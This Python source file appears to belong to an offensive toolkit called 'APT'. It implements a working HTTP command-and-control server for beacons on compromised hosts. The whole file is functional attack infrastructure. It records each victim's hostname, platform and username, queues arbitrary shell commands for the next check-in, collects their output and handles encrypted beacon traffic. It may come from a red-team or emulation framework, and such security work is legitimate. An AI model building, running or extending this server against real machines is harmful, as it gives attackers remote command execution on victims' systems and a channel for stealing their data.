"""Simple HTTP C2 server.

Runs in a background thread and manages beacon sessions.  The server exposes
two endpoints:

  POST /checkin   – beacon heartbeat; returns a TaskMessage or AckMessage
  POST /result    – beacon submits the output of a completed task

The server stores the latest check-in per session so that the APT UI can read
status and inject commands.

Usage (from APT)::

    from c2.server import C2Server
    server = C2Server(host="0.0.0.0", port=8443)
    server.start()          # starts a background daemon thread
    server.stop()           # shuts down the HTTP server
"""
from __future__ import annotations

import json
import logging
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Callable, Optional

from c2.protocol import (
    AckMessage,
    CheckinMessage,
    ResultMessage,
    TaskMessage,
    decrypt_message,
    encrypt_message,
)


logger = logging.getLogger(__name__)


class SessionState:
    """In-memory state for a single beacon session."""

    def __init__(self, session_id: str):
        self.session_id = session_id
        self.hostname: str = ""
        self.platform: str = ""
        self.username: str = ""
        self.last_seen: float = 0.0
        self.pending_task: Optional[TaskMessage] = None
        self.results: list[ResultMessage] = []
        self.psk: Optional[str] = None
        # Facts discovered about this session's host (mirrors Target.facts)
        self.facts: dict[str, bool] = {}


class C2Server:
    """Threaded HTTP C2 server."""

    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 8443,
        on_checkin: Optional[Callable[[SessionState], None]] = None,
        on_result: Optional[Callable[[SessionState, ResultMessage], None]] = None,
    ):
        self.host = host
        self.port = port
        self.sessions: dict[str, SessionState] = {}
        self._lock = threading.Lock()
        self._server: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None
        self.on_checkin = on_checkin
        self.on_result = on_result

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        handler = self._make_handler()
        self._server = HTTPServer((self.host, self.port), handler)
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        logger.info("C2 server listening on %s:%d", self.host, self.port)

    def stop(self) -> None:
        if self._server:
            self._server.shutdown()
            self._server = None
        logger.info("C2 server stopped")

    @property
    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    def push_command(self, session_id: str, command: str) -> bool:
        """Queue a shell command for the next beacon check-in.

        Returns True if the session exists, False otherwise.
        """
        with self._lock:
            sess = self.sessions.get(session_id)
            if sess is None:
                return False
            sess.pending_task = TaskMessage(session_id=session_id, command=command)
            return True

    def get_session(self, session_id: str) -> Optional[SessionState]:
        with self._lock:
            return self.sessions.get(session_id)

    def all_sessions(self) -> list[SessionState]:
        with self._lock:
            return list(self.sessions.values())

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _handle_checkin(self, body: dict) -> dict:
        msg = CheckinMessage.from_dict(body)
        with self._lock:
            sess = self.sessions.get(msg.session_id)
            if sess is None:
                sess = SessionState(msg.session_id)
                self.sessions[msg.session_id] = sess
            sess.hostname = msg.hostname
            sess.platform = msg.platform
            sess.username = msg.username
            sess.last_seen = time.time()
            task = sess.pending_task
            sess.pending_task = None

        if self.on_checkin:
            try:
                self.on_checkin(sess)
            except Exception as exc:
                logger.warning("on_checkin callback raised: %s", exc)

        if task:
            return task.to_dict()
        return AckMessage(session_id=msg.session_id).to_dict()

    def _handle_result(self, body: dict) -> dict:
        msg = ResultMessage.from_dict(body)
        with self._lock:
            sess = self.sessions.get(msg.session_id)
            if sess:
                sess.results.append(msg)

        if self.on_result and sess:
            try:
                self.on_result(sess, msg)
            except Exception as exc:
                logger.warning("on_result callback raised: %s", exc)

        return AckMessage(session_id=msg.session_id).to_dict()

    def _make_handler(self):
        server_ref = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                logger.debug("C2 HTTP: " + fmt, *args)

            def _read_json(self) -> Optional[dict]:
                length = int(self.headers.get("Content-Length", 0))
                if length == 0:
                    return None
                raw = self.rfile.read(length)
                try:
                    return json.loads(raw.decode())
                except (json.JSONDecodeError, UnicodeDecodeError):
                    return None

            def _send_json(self, data: dict, status: int = 200):
                payload = json.dumps(data).encode()
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(payload)))
                self.end_headers()
                self.wfile.write(payload)

            def do_POST(self):
                body = self._read_json()
                if body is None:
                    self._send_json({"error": "invalid body"}, 400)
                    return

                # Transparent decryption
                if body.get("type") == "encrypted":
                    sid = body.get("session_id", "")
                    sess = server_ref.get_session(sid)
                    psk = sess.psk if sess else None
                    if psk is None:
                        self._send_json({"error": "no psk for session"}, 403)
                        return
                    try:
                        body = decrypt_message(body, psk)
                    except Exception as exc:
                        logger.warning("Decryption failed: %s", exc)
                        self._send_json({"error": "decryption failed"}, 400)
                        return

                if self.path == "/checkin":
                    resp = server_ref._handle_checkin(body)
                elif self.path == "/result":
                    resp = server_ref._handle_result(body)
                else:
                    self._send_json({"error": "not found"}, 404)
                    return

                self._send_json(resp)

        return Handler
